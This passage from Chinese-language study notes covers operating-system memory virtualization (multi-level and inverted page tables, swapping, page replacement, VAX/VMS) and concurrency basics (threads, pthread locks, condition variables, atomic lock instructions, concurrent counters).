<p> 更大的单页有一个额外的好处是可以提高 TLB 的命中率，减少 TLB 记录数；这对于某些特定的应用，例如数据库管理程序很有必要，因为数据库中的数据是挨在一起的一个整体，而且经常频繁的随机访问，通过大单页，例如单页 4MB，可以有效提高缓存命中率，减轻 TLB 的压力；</p>
</blockquote>
<h3 id="方法二：分段-分页"><a href="#方法二：分段-分页" class="headerlink" title="方法二：分段+分页"></a>方法二：分段+分页</h3><p>由于虚拟地址空间很大，但实际的进程实际的地址，只占里面很小很小的一部分，因此如果页表为整个虚拟地址空间都提供映射记录，显然绝大部分记录都是空的，存在巨大的空间浪费；所以，可以通过引入分段，为虚拟地址空间中的不同段，提供不同的页表，而不再是一个页表；</p>
<p>由于分段在原先的虚拟内存设计中就已经天然存在，因此可以提前已经存在的段基址寄存器（包括代码段、堆段和栈段），让它们的值指向对应段的页表的物理内存地址，即可以访问每个段各自的页表；</p>
<blockquote>
<p>简单的分段其实并不能带来页表占用空间变小的好处，因为每个段也是很大的，关键点在于引入每个段的界限；当一个段拥有界限后，它不再是很大了，而是有限的大（通常都很小）；界限的存在是通过界限寄存器来实现的，通过在界限寄存器中保存一个段大小的值，我们就拥有了有限大小的段；然后页表的记录数，也只需跟段的大小匹配即可，这样页表就变得很小了；</p>
</blockquote>
<p>分段+分页的方法其实是要付出一定的性能代价的，因为段的大小是动态可变的，这意味相应段的页表也变成了动态的；因为当原分配给页表的空间不够用时，就需要为页表分配新的空间并迁移它；</p>
<h3 id="方法三：多级页表"><a href="#方法三：多级页表" class="headerlink" title="方法三：多级页表"></a>方法三：多级页表</h3><p>虚拟地址空间也是很稀疏的，通过引入页表，让它在物理内存中的存放变得紧凑和灵活了起来；同样的思想也可以运用在页表本身的存储上面，通过引入页目录的结构（作用跟页表类似），页表不再被线性存储，而是映射存储；这个方法的优点是占用的空间大大减少了，只按最小单位（页）来存储，没有浪费；缺点是需要付出一定的性能代价，因为页目录本身也是需要存储在内存中，在得到最终的 PFN 前，需要增加一次或多次物理内存访问（取决于页表分成几级）；</p>
<blockquote>
<p>就像内存虚拟化技术一样，多级页表相当于将页表虚拟化了；而且还不只是一级的虚拟化，为了最小化内存占用，还可以丧心病狂的使用多级虚拟化；</p>
</blockquote>
<h3 id="方法四：反向页表"><a href="#方法四：反向页表" class="headerlink" title="方法四：反向页表"></a>方法四：反向页表</h3><p>反向页表的思路更加极端，在多级页表中，每个进程拥有自己的页表，而反向页表，则是所有进程共用一个页表；该页表的单个页表项中，包括三方面的信息：</p>
<ul>
<li>地址空间标识符：用来记录当前记录属于哪个进程；</li>
<li>VPN 虚拟页号</li>
<li>PFN 物理页号</li>
</ul>
<p>然后使用 HASH 散列表结构来建立映射和存储；类似于以字典键值对的方式来实现映射和转换；优点是极端节省空间；缺点是性能将有所下降，因为随着字典变大，需要进行迁移，分配更大的空间来容纳映射关系；</p>
<h3 id="方法五：交换到磁盘"><a href="#方法五：交换到磁盘" class="headerlink" title="方法五：交换到磁盘"></a>方法五：交换到磁盘</h3><p>这个方法倒是一劳永逸的节省空间，但是性能最差；</p>
<h2 id="17-物理内存不足：机制"><a href="#17-物理内存不足：机制" class="headerlink" title="17.物理内存不足：机制"></a>17.物理内存不足：机制</h2><p>虽然现在的物理内存相对早期已经大了，但是应用程序运行时所占用的内存也比过去变得更大；当同时运行的应用程序足够多时，不可避免会遇到物理内存不足的情况，此时需要有一个机制，能够将部分物理内存转移到其他存储空间，等需要的时候，再转回来，以避免物理内存不足的窘境；</p>
<h3 id="交换空间"><a href="#交换空间" class="headerlink" title="交换空间"></a>交换空间</h3><p>交换空间 swap space 机制是现代系统使用的一种解决方案；通过将部分暂时不用的物理内存页，交换到硬盘中，来缓解内存不足的问题；</p>
<blockquote>
<p>进程运行起来后，代码已经被加载到内存；如果此时运行下一个程序时，发现内存不足，此时有两种解决方案，一是将上一个程序的代码转移到交换空间中；另一个是不交换，等后续要用的时候，再重新从硬盘中加载，因为代码本来就是从硬盘中加载过来的；</p>
</blockquote>
<h3 id="存在位"><a href="#存在位" class="headerlink" title="存在位"></a>存在位</h3><p>为了能够实现交换空间机制，需要在页表中额外安排一个位，用来表示当前条目所代表的物理内存页，是否真的在物理内存中，还是在硬盘上，这个位称为有效位；</p>
<p>当试图访问一个存在位为 0 的物理页时，会触发页错误，然后操作系统会接管并处理这个错误，将数据从硬盘加载到内存中，然后重新执行指令；</p>
<blockquote>
<p>页不存在只是页错误的一种，还有其他情况也会触发页错误，例如非法访问；</p>
</blockquote>
<h3 id="页错误"><a href="#页错误" class="headerlink" title="页错误"></a>页错误</h3><p>当数据存储在物理内存页中的时候，PFN 是有用的，但是如果该页被交换到了硬盘中，则 PFN 就没有用了（失效了），此时只需通过存在位，即可以触发页错误；因此，无效的 PFN 所占用的位，刚好可以用来存储数据在硬盘上面的位置索引；操作系统可以根据该索引，从交换空间中，将数据加载回内存；然后更新页表中的 PTE 条目的 PFN 为最新值，并更新 TLB 记录（硬盘管理 TLB 的系统估计不更新，只有软件管理的才会），之后重试指令；</p>
<h3 id="交换策略"><a href="#交换策略" class="headerlink" title="交换策略"></a>交换策略</h3><p>当从硬盘中将页数据交换回物理内存时，有可能物理内存已经是满的，此时需要将部分页换出到硬盘上，如果选择待换出的内存页，需要使用一个好的交换策略，以避免给程序运行带来巨大的性能损失；</p>
<h3 id="页错误处理"><a href="#页错误处理" class="headerlink" title="页错误处理"></a>页错误处理</h3><p>当页错误被触发时，操作系统从 PTE 中获得硬盘地址，然后在物理内存中寻找到空闲页，访问硬盘读取页数据，并加载数据到空闲页中，将该空闲页的页号更新到 PTE 中；如果没有找到空闲页，则会触发页交换，将物理内存中已有的部分页面，交换到硬盘上；</p>
<h3 id="什么时候交换"><a href="#什么时候交换" class="headerlink" title="什么时候交换"></a>什么时候交换</h3><p>操作系统会设置两条线，一条是低水位警戒线，当物理内存中可用的空闲页低该警戒线时，就会触发页交换守护进程（page daemon 或 swap daemon）；另一条是高水位安全线；交换守护进程的交换工作会一直持续到当前可用的内存页到达安全线后停止下来，然后进入休眠状态，直到下次被唤醒；</p>
<p>由于硬盘的写入速度很慢，交换进程会凑齐足够数据的待交换页后，再一次性交给硬盘处理，从而提高硬盘的访问性能；</p>
<h2 id="18-物理内存不足：策略"><a href="#18-物理内存不足：策略" class="headerlink" title="18.物理内存不足：策略"></a>18.物理内存不足：策略</h2><p>当物理内存满了时，选择哪些页面，将它们转移到交换空间，是一个需要好好思考的问题；由于硬盘的访问速度非常慢，因此如有可能，应该尽量避免出现访问硬盘的情况，至少要让概率尽可能小；</p>
<p>理想的替换策略是将未来最不可能用到的页替换出来，这样命中率是最优的，缺点是这个策略基本无法实现；因为在替换的时候，我们无法开启上帝视角，无法判断哪个页是将来最不可能会用到的；</p>
<h3 id="简单策略：FIFO"><a href="#简单策略：FIFO" class="headerlink" title="简单策略：FIFO"></a>简单策略：FIFO</h3><p>先进先出是最简单的策略，缺点是命中率比较低；</p>
<h3 id="随机策略：Random"><a href="#随机策略：Random" class="headerlink" title="随机策略：Random"></a>随机策略：Random</h3><p>优点：实现简单；</p>
<p>缺点：性能看运气；</p>
<h3 id="基于历史：LRU"><a href="#基于历史：LRU" class="headerlink" title="基于历史：LRU"></a>基于历史：LRU</h3><p>LRU 是 Least Recently Used 的缩写，表示最少最近使用；</p>
<blockquote>
<p>这个策略利用了程序运行时常常表现出来的局部性特征，即最近访问的数据，也可能在接下来再次被访问；</p>
</blockquote>
<h3 id="性能视场景而定"><a href="#性能视场景而定" class="headerlink" title="性能视场景而定"></a>性能视场景而定</h3><p>不同的业务场景将决定不同策略的性能表现，虽然 LRU 在多数情况下表现的更好，但它也有一些应付不了的极端情况，此时有可能随机策略反而表现得更好；</p>
<h3 id="LRU-的实现"><a href="#LRU-的实现" class="headerlink" title="LRU 的实现"></a>LRU 的实现</h3><p>想要实现 LRU 是有难度的，因为它需要额外记录每个内存页最近被引用的时间，这样才能判断出谁是最少最近使用的；但随着物理内存变大，页表条目变多，通过全局扫描查找最少最近使用条目，将需要付出巨大的时间代价，有可能得不偿失；</p>
<h3 id="近似-LRU"><a href="#近似-LRU" class="headerlink" title="近似 LRU"></a>近似 LRU</h3><p>由于完美的 LRU 实现代价很大，因此需要寻找一个近似的替换算法，这样既可以避免性能开销，又可能达到类似的命中率效果；</p>
<p>这类型的近似算法有很多，它们大体的思路也类似，即通过增加一个使用位，来标示当前页是否最近被使用，初始默认所有页的使用位都为 0；使用某个指针寄存器，让它随机批向一个页；当某个页被读写的时候，就将其使用位设置为 1，表示最近该页有过读写的动作；当需要进行页替换时，操作系统通过指针往下遍历每个页，如果某页的使用位为 1，则将其设置为 0，然后继续往下查找，当找到第一个“使用位”非 0 的页时就进行替换；</p>
<blockquote>
<p>除了使用遍历查找外，还可以考虑使用随机查找，效果差不多；</p>
</blockquote>
<h3 id="考虑脏页"><a href="#考虑脏页" class="headerlink" title="考虑脏页"></a>考虑脏页</h3><p>由于与硬盘通信的开销很大，一般会将多个修改后的页进行批量化处理，集中一次性的写入，而不是改一个写一个；因此在替换内存页的时候，有可能会遇到该页暂未写入硬盘的情况；因此，通过增加一个修改位（脏页位）来对已修改未写入的页进行标识，不替换该页，而是尽量替换干净页；</p>
<h3 id="其他读写策略"><a href="#其他读写策略" class="headerlink" title="其他读写策略"></a>其他读写策略</h3><p>除了页替换策略外，虚拟内存还同时使用一些其他的策略来提高内存管理的效率，例如：</p>
<ul>
<li>按需读取策略：只在页被指令访问时，才将页从硬盘中加载到内存中；</li>
<li>预读取策略：只在有很大把握某个页接下将被访问时，提前将页从硬盘中加载到内存；</li>
<li>批量写入策略：集中将多个内存页的修改，一次性写入硬盘，而不是改一个就马上写入；</li>
</ul>
<h3 id="抖动"><a href="#抖动" class="headerlink" title="抖动"></a>抖动</h3><p>当应用程序对某个巨大的数据结构进行计算时，如果该数据结构占用的内存超过了物理内存的可能容量，那么在计算过程中，部分数据将被交换到硬盘中，然后又很快需要被加载回来，同时又换出去一部分，反复循环，导致 CPU 都将时间花费在了触发页错误和加载数据过程中，完全没有办法进行实际的计算，这种情况称为内存的抖动；</p>
<h2 id="19-VAX-VMS-虚拟内存系统"><a href="#19-VAX-VMS-虚拟内存系统" class="headerlink" title="19.VAX&#x2F;VMS 虚拟内存系统"></a>19.VAX&#x2F;VMS 虚拟内存系统</h2><p>操作系统的部分功能需要硬件的配合，才有可能高效稳定的实现，但是市场上的硬件种类多种多样，而且不同硬件的开发人员水平参差不齐，不可避免存在缺陷，因此操作系统的开发者将不可避免需要解决通用性的问题，即如何让同一个操作系统，在不同的硬件上面，都可以稳定的运行。</p>
<h3 id="操作系统的存储"><a href="#操作系统的存储" class="headerlink" title="操作系统的存储"></a>操作系统的存储</h3><p>操作系统本身也需要物理内存来存储自己的代码和数据，它有三种实现方式：</p>
<ul>
<li>直接存储在物理内存中（缺点：无法实现页交换，因为没有虚拟内存这一层）</li>
<li>有自己的完整虚拟内存，像是另外一个单独的应用程序（缺点：不方便和应用程序之间的数据通信）</li>
<li>做为应用程序的一段分，使用单独的段（内核段）来映射它（目前为大多数系统所采用）</li>
</ul>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201021081210.png"></p>
<blockquote>
<p>问：好奇是内核否有自己的单独页表，还是与应用程序共用一张页表，因为内核段也有自己的堆，意味着有动态的数据需要存储？如果是共用页表的话，每张页表都有一些重复的项目，有一定的空间浪费；</p>
<p>答：实际上很可能是使用分段+分页的机制，即总共有三对基址寄存器和界限寄存器（总共6个）；内核段有自己的基址和界限寄存器，而且还是每个应用共用的；在进行应用程序切换时，只需要改变 P0 和 P1 寄存器，无须改变 S 寄存器；</p>
</blockquote>
<h3 id="页替换"><a href="#页替换" class="headerlink" title="页替换"></a>页替换</h3><blockquote>
<p>问：在进行页替换的时候，LRU 策略是一种全局的策略，它只会从当前页表的所有条目中，挑出最少最近使用的进行替换，而无视这些页表本身是否占用了过大的内存；因此，需要设计一种机制，对单个进程的可用内存上限进行控制；</p>
</blockquote>
<h4 id="FIFO"><a href="#FIFO" class="headerlink" title="FIFO"></a>FIFO</h4><p>解决方法是为每个进程设置一个可用内存的上限（由于内存是分页的，相当于有了一个可用的页数上限）；将进程的所有页都放在一个 FIFO 列表中，当列表的长度达到上限时，就基于先进先出的原则，将最早写入的页从 FIFO 列表中清除，并替换到硬盘上的交换空间中；</p>
<p>如果可用上限值比较小，立即执行的 FIFO 策略，将有可能使得进程的性能下降，因为其数据频繁的在内存和硬盘之间交换；为了提高性能，VMS 系统额外增加两个全局的列表，一个用来存放干净的页，一个用来存放脏页；</p>
<p>当某个进程 P 的 FIFO 列表满了时，踢出的页并不会马上被交换到硬盘中，则是先放入干净页或者脏页（取决于脏位的值）的末尾，此时进程 P 的性能并没有受到任何的影响，因为它所有的页仍然在内存中；</p>
<p>当进程 P 执行结束，切换到进程 Q 时，如果进程 Q 需要用到一个空闲页来存储数据时，系统就从干净列表的头部取出一个页，将其替换到硬盘上，然后交给进程 Q 使用；</p>
<blockquote>
<p>如果两个全局列表的长度足够大，这种策略的性能将非常接近于 LRU 策略；这个策略本质上利用了局部性的原理，将各个进程要换出的干净页先集中放在一起，然后按时间顺序，先进先出的替换；这样避免了替换最近的页，而是替换最远的；</p>
</blockquote>
<h4 id="批量处理"><a href="#批量处理" class="headerlink" title="批量处理"></a>批量处理</h4><p>上述增加全局脏页列表的做法，还有另外一个好处，即由于写入硬盘的性能代价比较大，因为可以等到脏列表满了后，再一次性的批量写入，这样就可以尽量减少写入的次数；写入完了后，原来的脏页就变成了干净页了；</p>
<blockquote>
<p>VMS 的页表条目中，并没有额外的使用位来标记条目所代表的页，是否最近被引用过；它使用了另外一个巧妙的机制，来达到相同的效果，即使用保护位；初始化的时候，所有条目的保护位先置为不可访问；因为操作系统在访问一个页之前，即判断它的权限，如果可访问，则将保护位设置为只读或可写；这样，当需要进行页替换时，操作系统可以通过查看保护位是否被重置过，如果有，表示最近有被使用；如果没有，表示未被使用；</p>
</blockquote>
<blockquote>
<p> 问：将应用程序从硬盘中加载到内存中的时候，到底发生了什么？</p>
<p> 答：操作系统需要做如下事项：</p>
<ul>
<li>在进程表中增加一个条目，并写入一些关于进程的元信息</li>
<li>初始化一个新的页表（此处假设是单个线性页表），在进程条目中记录该页表在物理内存中的位置</li>
<li>寻找空闲页，将代码和数据载入空闲页中，将空闲页的 PFN 写入页表的相应位置；</li>
</ul>
</blockquote>
<h3 id="惰性技巧"><a href="#惰性技巧" class="headerlink" title="惰性技巧"></a>惰性技巧</h3><h4 id="按需置零"><a href="#按需置零" class="headerlink" title="按需置零"></a>按需置零</h4><p>因为物理内存是在多个应用程序间共用的，当某个物理内存页被 A 进程释放后，随后该页可能会被进程 B 使用，但此时页上面仍然留有 A 进程的数据，因此需要避免这些数据被 B 访问，这样才能确保安全性；比较土的办法是在该页分配给 B 使用时，就将该页上面的全部数据置 0，这样做可以确保绝对安全，但是性能代价很大，因为有可能 B 只用到该页的一小部分空间，大部分空间并不使用；</p>
<p>通过引入按需置零策略，可以减少性能开销；在分配页给 B 时，操作系统只是先通过保留位将该页标记为按需置零，并不真正的去置零；然后在真的要读写数据时，在检查权限的时候，操作系统顺便检查按需置零位，如果为真，则再做一下置零的工作；</p>
<h4 id="写时复制"><a href="#写时复制" class="headerlink" title="写时复制"></a>写时复制</h4><p>当某页数据需要从进程 A 复制到进程 B 时，操作系统一开始并没有直接的复制数据，而只是将该页的物理页号写入进程 B  页表中，这样两个进程不同的 VPN 映射到了相同的 PFN，并在进程 B 中将该页标记为只读；后续如果进程 B 需要对该页进行写入操作，操作系统发现该页为已读，此时才会触发真正分配新页和复制工作；</p>
<blockquote>
<p>这个技术在 FORK 的时候特别有用，减少了极大的性能开销；另外在多个进程之间使用共享库时也有用；</p>
</blockquote>
<h2 id="20-并发：介绍"><a href="#20-并发：介绍" class="headerlink" title="20.并发：介绍"></a>20.并发：介绍</h2><p>通常情况下，进程只面对一个使用者，仅有单一的任务目标，完成一系列指定的操作并得到结果；但是有些情况下，进程可能要面对多个使用者，例如运行在服务器上的进程，为成千上万的访问者提供服务；这些访问者发起的服务请求，对进程来说形成了一种并发的挑战；为了应对这个挑战，引入了线程的概念；</p>
<p>每个线程拥有自己一个独立的栈，不同线程之间的栈不会相互干扰；但它们共用进程的整个地址空间；因此，在切换线程时，并不需要更改页表的寄存器，只需更新程序计数器，以及其它用于存储计算结果的寄存器；</p>
<blockquote>
<p>进程切换时，需要保存当前进程的状态，使用进程控制块（Process Control Block，PCB）来保存；</p>
<p>线程切换时，使用原理类似的线程控制块（Thread Control Block，TCB）来保存；</p>
</blockquote>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201023080610.png"></p>
<blockquote>
<p> 当创建一个线程时，需要传递待执行的例程（即函数）给它，至于这个例程什么时候被 CPU 安排执行，则是不可控的，它有可能比主程序的下一行代码早，也可能比它晚，一切取决于操作系统的调度程序当时心情怎么样。</p>
</blockquote>
<h3 id="并发场景"><a href="#并发场景" class="headerlink" title="并发场景"></a>并发场景</h3><ul>
<li>修改全局变量：两个线程访问修改彼此共享的变量；</li>
<li>依赖：一个线程的执行需要等待另外一个线程的结束；</li>
</ul>
<h2 id="21-插叙：线程-API"><a href="#21-插叙：线程-API" class="headerlink" title="21.插叙：线程 API"></a>21.插叙：线程 API</h2><h3 id="创建与完成"><a href="#创建与完成" class="headerlink" title="创建与完成"></a>创建与完成</h3><blockquote>
<p>问题：操作系统应该提供哪些创建线程的接口，并当它们简单易用？</p>
</blockquote>
<p>在 C 中，可以通过 POSIX 库的 phread_create 函数来创建线程，并通过 phread_join 函数来等待它的返回；</p>
<blockquote>
<p>如果每创建一个线程后，马上调用 join 函数等待它的返回，这样完全没有意义，完全实现不了并发，其使用效果跟普通的函数调用没有任何区别；因此重点在于在等于线程返回前，有机会创建更多的线程，这样才有可能实现并发的效果；</p>
</blockquote>
<p>有些多线程的 Web 服务器会创建一个主线程，并根据需要创建大量的工作线程；当主线程收到用户的请求后，会将该请求转发给某个刚创建好的工作线程，并且也不需要等待它的返回，这样一来，主线程本身就实现了并发的处理，即它在理论上可以接收并处理海量的请求（具体的数量上限取决于硬件的能力）</p>
<h3 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h3><p>当线程需要对共享的全局变量进行修改时，不可能避免需要处理并发的问题；Pthread 库通过引入锁机制来实现；原理也非常简单，先初始化一个锁类型的变量，当需要执行临界代码时（即将改变共享变量的代码），调用 phread_mutex_lock 来尝试获取锁；</p>
<ul>
<li>如果能够得到，就继续往下执行代码，并在执行完毕后调用 pthread_mutex_unlock 函数来释放锁，以便让其他等待中的线程可以获取到锁；</li>
<li>如果不能得到，就进入阻塞等待的状态，直到获取到锁为止；</li>
</ul>
<p>Pthread 库中另外还有其他与锁相关的函数，包括：</p>
<ul>
<li>pthread_mutex_trylock：用来尝试获取锁，如果得不到，直接返回失败，不等待；</li>
<li>pthread_mutex_timelock：用来尝试获取锁，并在给定的时间内等待，如果时间到期后仍然得不到，返回失败；</li>
</ul>
<blockquote>
<p>用途：锁的机制可以用来解决多个线程修改共享的全局变量场景；</p>
</blockquote>
<h3 id="条件变量"><a href="#条件变量" class="headerlink" title="条件变量"></a>条件变量</h3><blockquote>
<p>用途：条件变量可以用来解决线程之间的依赖等待关系；仅靠条件变量性能不够好，结合锁的使用，有助于提高性能，避免等待线程出现自旋；假设有两个线程，其中 B 需要等待 A 的结果；当 B 获取不到锁时，就进入睡眠；如果 B 能够获取到锁，但条件变量未满足，则 B 就释放锁，然后进入睡眠；A 则负责获取锁，并在计算完成后，改变条件变量，然后释放锁，并唤醒 B；</p>
</blockquote>
<p>假设某个线程 A 的执行，依赖于另外一个线程 B 的完成，则 B 在完成后，需要释放某种信号，以便 A 可以知悉状态，并开始执行自己的代码；</p>
<p>最简单的办法是引入一个标记变量（或叫状态变量），A 线程定时检查标记变量是否发生了变化，如果已经变化了，就开始执行自己的代码；B 线程负责在完成自己的工作后，改变标记变量的值，以便传递信号通知 A 线程；</p>
<p>但是上述这种方法的性能很不好，因为 A 线程需要循环的检查标记变量，可能在大部分时间内，其检查工作都是无用的；为了解决性能，可以通过引入条件变量和锁变量，利用条件变量的特殊性来降低性能损失；其原理是先调用函数让需要等待的线程 A 进入睡眠状态，然后 B 线程通过改变条件变量来唤醒它；这样 A 线程在等待期间就不需要反复检查前一种方法中的标记变量了；这种方法更加安全的原因在于 A、B 线程通过引入锁保证了执行的先后顺序；</p>
<ul>
<li>pthread_mutex_wait(&amp;cond, &amp;lock)：该函数接收一个条件变量和一个锁变量作为参数；当调用该函数时，它会让当前线程 A 进入睡眠状态，并释放锁；</li>
<li>pthread_mutex_signal(&amp;cond)：在线程 B 中，在获得 &amp;lock 指向的锁后，开始执行自己的代码，并在执行完毕后，调用 pthread_mutex_signal 函数，它会更改 &amp;cond 变量，以便发出信号唤醒处于睡眠状态的 A 线程；之后线程 B 还需要调用 pthread_mutex_unlock 函数释放锁，以便线程 A 在唤醒后可以获得锁</li>
</ul>
<blockquote>
<p>&amp;cond 可以用来唤醒另外一个进程，但为了保险起见，书中的例子还额外引入了一个 ready 变量，来确保 B 线程的代码真正完成了指定的操作，以便防止 A 线程被意外唤醒的情况；相关于有了双保险的机制；</p>
</blockquote>
<h2 id="22-锁"><a href="#22-锁" class="headerlink" title="22. 锁"></a>22. 锁</h2><p>表面上看，锁好像是一个类似状态变量的东西，但其实它是一个结构，里面除了保存状态值外，还保存着当前持有它的线程信息，只是这些信息通常对使用者是隐藏的；</p>
<blockquote>
<p>问：锁为程序员提供了一个很方便的实现线程有序并发的工具，但在操作系统和硬件层面，它们需要如何实现锁的机制？</p>
<p>答：需要 CPU 提供一些原子性的指令，这些指令可以用来修改设置变量，从而实现锁的机制；仅由软件实现的锁机制是不可靠的，因为完全不知道 CPU 的时钟中断何时会发生，而一旦发生，将使得处理逻辑失效；</p>
</blockquote>
<h3 id="评价锁"><a href="#评价锁" class="headerlink" title="评价锁"></a>评价锁</h3><p>锁的实现有多种方案，有三个维度可以用来评价实现方案的优劣：</p>
<ul>
<li>有效性：能够真的实现互斥的效果；</li>
<li>公平性：不至于有些等待线程一直无法抢到锁，导致最终饿死了；</li>
<li>性能：引入锁之后，性能开销最小化；</li>
</ul>
<h3 id="方案1：控制中断"><a href="#方案1：控制中断" class="headerlink" title="方案1：控制中断"></a>方案1：控制中断</h3><p>之所以会面临并发的问题，在于 CPU 的操作并非原子性的，它通过时钟中断来实现在不同进程或线程之间的切换；因此当线程进入临界区后，如果能够关闭中断，等待当前线程处理完，再恢复中断，就可以实现互斥性；</p>
<p>控制中断的方案实现起来很简单，但是缺点很多，包括：</p>
<ul>
<li>无法规避恶意程序；</li>
<li>无法支持多处理器；</li>
<li>中断时可能丢失其他程序发出的中断消息；</li>
<li>性能太差：因为 CPU 内部要做一系列准备工作；</li>
</ul>
<p>基于以上这么多的缺点，这种实现方案用得场景非常少；仅在操作系统内部使用，而不是在 CPU 内部使用，即操作系统选择性的在某些时刻暂时屏蔽它自己接收到的中断消息，将手头某个任务全部处理完后，再恢复处理中断队列中的消息；</p>
<blockquote>
<p>没有硬件支持，仅通过软件实现的锁很危险，因为完全无法控制时钟中断何时会发生，有可能当前线程 A 正检查完锁可用时，中断了，切换到另外一个线程 B，然后它也发现锁可用；然后设置标记变量为 1；这时中断发生，切换回进程 A ，它接着上次的中断处继续进行，也觉得当前锁自己可用；最终的结果是两个线程同时进入了临界区；锁的互斥性根据没有得到有效实现；因此，必须有硬件的支持，让某些操作指令原子化；</p>
</blockquote>
<h3 id="方案2：测试并设置指令"><a href="#方案2：测试并设置指令" class="headerlink" title="方案2：测试并设置指令"></a>方案2：测试并设置指令</h3><p>“测试并设置”指令也叫做原子交换（atomic exchange），它的思路是设置一条由 CPU 支持的原子性执行的指令；这条指令会取出旧值，设置新值，并返回旧值；</p>
<p>当有了这条原子性执行的指令后，应用程序就可以基于它们来实现锁；当一个线程暂时取不到锁时，它会陷入自旋等待，直到另外一个线程释放了锁为止；</p>
<blockquote>
<p>在 x86 机器上，原子交换指令写成 xchg；</p>
</blockquote>
<p>自旋等待的锁有两个缺点：</p>
<ul>
<li>在等待期间，会消耗掉分配给它的完整时钟周期，无谓消耗浪费了很多性能；当线程特别多且为单处理器时，这点尤其明显；</li>
<li>自旋机制本身不保证线程不会饿死，线程能否抢到锁，完全看调度器的心情；</li>
</ul>
<h3 id="方案3：比较并交换指令"><a href="#方案3：比较并交换指令" class="headerlink" title="方案3：比较并交换指令"></a>方案3：比较并交换指令</h3><p>“比较并交换”指令也是一条由 CPU 支持的原子性执行的指令，它跟“测试并设置“指令的区别在于多了一个参数，这个参数会传入一个预期值，若旧值和预期值相同，再更新为新值，否则不更新；该指令也同样会返回旧值；</p>
<blockquote>
<p>相当于“测试并设置”一定会更新旧值，而“比较并交换“不一定会更新旧值；</p>
</blockquote>
<h3 id="方案4：链接加载和条件存储指令"><a href="#方案4：链接加载和条件存储指令" class="headerlink" title="方案4：链接加载和条件存储指令"></a>方案4：链接加载和条件存储指令</h3><p>这个方案用到了两条指令，一条用来加载指针指向的值，另外一条会判断该指针地址指向的值是否发生了更新，若没有发生，则将其设置为新值；</p>
<p>通过这两条指令的配合，可以用来实现锁机制；思路是当执行 lock 函数时，先加载标记变量的值，若为1，则自旋等待，因为表示此时有其他线程占用着锁；若为 0，则使用条件存储指令进行抢占；条件存储指令是原子性的，它会判断标记变量的值是否发生过更新，如果没有，意味着还没有其他线程抢占过，则更新它，并获得锁；如发生过更新，表示有线程提前抢占成功，重新开始循环；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201029074930.png"></p>
<h3 id="方案5：获取并增加指令"><a href="#方案5：获取并增加指令" class="headerlink" title="方案5：获取并增加指令"></a>方案5：获取并增加指令</h3><p>这个指令很有意思，它引入了两个标记变量，一个用来表示排队号，一个用来表示当前叫号；跟银行的叫号机工作原理差不多；初始状态下，排号的号码从零开始；第一个线程进来后，取到 n 号，然后排号增加 1，即下一排队号变成了 n + 1 号；取完号后，去窗口看一下当前的叫号，如果刚好是 n 号，则获取锁（开始给它办理业务）；如果不是 n 号，则等候；当线程释放锁时，窗口的服务人员会将叫号增加 1，这样持有该排队号的线程接下来就可以办理业务了；</p>
<p>这个指令有一个特别大的好处，即每个线程都有机会轮上，而且还是先来后到；前后三种方案则无法保证线程什么时候会被安排，靠运气；</p>
<h3 id="避免自旋"><a href="#避免自旋" class="headerlink" title="避免自旋"></a>避免自旋</h3><p>显然当一个线程无法获取锁时，一直处于自旋等待是完全没有必要的，纯粹是浪费分配给它的 CPU 时钟周期；如果线程很多的话，就会极大的降低性能，因此有必要当线程进入自旋时，就要求它放弃当前的时间片，切换到其他线程；</p>
<p>方法一是在操作系统层面增加一个能够让出当前调度的系统调用，这样当线程发现自己无法获取锁时，就调用该函数，结束当前的 CPU 时间片；这种方法的性能比自旋好了不少，不过如果线程很多的话，仍然可能产生很高的线程切换成本；</p>
<p>方法二是引入休眠功能，并增加一个队列；当线程无法自己获取锁时，就将自己放到队列中等待，然后进入休眠状态，这样它就不再需要频繁的被切换；当其他线程释放锁时，它就去队列里面找一个线程唤醒它； </p>
<blockquote>
<p>结合队列，当一个线程取号后，就查看一下当前叫号，如果不是自己的号，就进入休眠队列，等待被唤醒；当某个线程释放锁时，叫号增加1，然后唤醒队列中对应编号的线程；该线程被唤醒后，检查一下当前叫号，如果是自己，就去尝试获取锁；如果不是自己，重新进入休眠；如果获取不到锁，则意味着有人抢占了，也重新进入休眠；</p>
</blockquote>
<h2 id="23-使用锁的并发数据结构"><a href="#23-使用锁的并发数据结构" class="headerlink" title="23.使用锁的并发数据结构"></a>23.使用锁的并发数据结构</h2><p>锁的目的是应对并发的场景，但并非所有的并发，都需要使用锁；只有并发场景需要访问修改共享变量时，才需要用锁；这个时候，在设计数据结构的访问修改函数时，需要考虑锁的使用时机和位置，这样才能确保数据的线程安全；但确保线程安全不难，如果要同时兼顾性能，就开始形成一定的挑战了；</p>
<h3 id="并发计数器"><a href="#并发计数器" class="headerlink" title="并发计数器"></a>并发计数器</h3><p>计数器是很常见和频繁使用的一种数据结构，某些场景需要在多线程之间共享某个计数器，此时该数据结构将面临线程安全问题；此时会遇到的一个问题是可扩展性，即保证线程安全的情况下，访问性能没有下降，即实现可扩展的计数；</p>
<h4 id="可扩展的计数"><a href="#可扩展的计数" class="headerlink" title="可扩展的计数"></a>可扩展的计数</h4><blockquote>
<p> 单核多线程可以实现并发，但并没有提高性能，只有多核多线程，才通过利用了多核的优势，提高了性能；所谓的可扩展性是指，在引入多核的情况下，原本的锁设计，仍然能够保证对数据结构的访问，能够获得跟单核单线程同样的性能；</p>
</blockquote>
<p>它的实现有很多种办法，其中一种叫懒惰计数器，它通过牺牲一点准确性，来保证性能问题；其基本思路是使用全局锁和全局变量来记录全局的计数器，但在每个 CPU 里面，又增加一个局部计数器和局部锁；对于单个 CPU 内部的线程，它只负责当前 CPU 的锁并更新局部的计数器，这样一来没有人跟它竞争，因此它的性能同单核单线程是一样的；然后设定一个阈值，当某个 CPU 的局部计数器值越过这个阈值时，该 CPU 就尝试获取全局锁，将自己的局部计数器值同步写入全局的计数器；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201030082047.png"></p>
<p>整体来说，当 S 足够大时，这种方法的性能跟单核单线程越接近，但是全局计数器会有一定的延迟；即任意时间点下，获取到的全局计数器值，可能并不是最新的，而是对应于过去的某个时间点；</p>
